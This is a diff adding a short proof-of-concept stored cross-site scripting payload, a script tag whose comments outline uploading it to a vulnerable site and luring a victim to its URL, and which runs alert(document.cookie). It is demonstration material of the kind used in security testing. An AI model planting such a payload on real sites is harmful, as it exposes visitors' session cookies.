@@ -1,0 +1,9 @@
+<script>
+// POC payload for Stored XSS via malicious upload
+// 
+// 1. Attacker uploads this malicious file to a vulnerable website.
+// 2. Attacker determines the URL of this malicious file.
+// 3. Attacker gets victim to browse to the malious URL.
+// 4. This malicious file executes in the victim's browser.
+alert(document.cookie);
+</script>
